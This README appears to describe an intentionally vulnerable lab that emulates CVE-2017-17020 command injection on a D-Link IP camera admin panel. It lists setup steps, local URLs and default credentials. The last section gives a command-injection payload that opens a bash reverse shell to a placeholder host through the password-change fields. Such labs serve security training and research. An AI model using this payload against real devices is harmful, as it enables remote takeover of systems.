# IoT project that emitatee real world IoT ip camera vulnerabilities

This project aims to emulate real world vulnerabilities inside IoT devices. This project emulates (without the telnet daemon) the vulnerability cve-2017-17020 present on the DLINK DCS-5020L camera devices.
The project was built with the help of the project cam2ip and the use of traefik and Flask to serve the admin panel.

### Resources
[Blogpost Talking about the cve discovery and exploitation](https://fidusinfosec.com/dlink-dcs-5030l-remote-code-execution-cve-2017-17020/)

[Exploit DB entry](https://www.exploit-db.com/exploits/44580)

[Talk about exploiting the cve](https://youtu.be/jiYv-bQ2UX8)

### Run camera:

```bash
docker-compose up --build
```

### Camera image

```
http://localhost/
```

### Admin panel

```
http://localhost/admin
```

### Default credentials
```
admin:johncena
```

### Payload for shell (used on the change admin password on the new pass fields)
```
‘`bash -c 'exec bash -i &>/dev/tcp/YOUR_IP/9999 <&1'`’
```
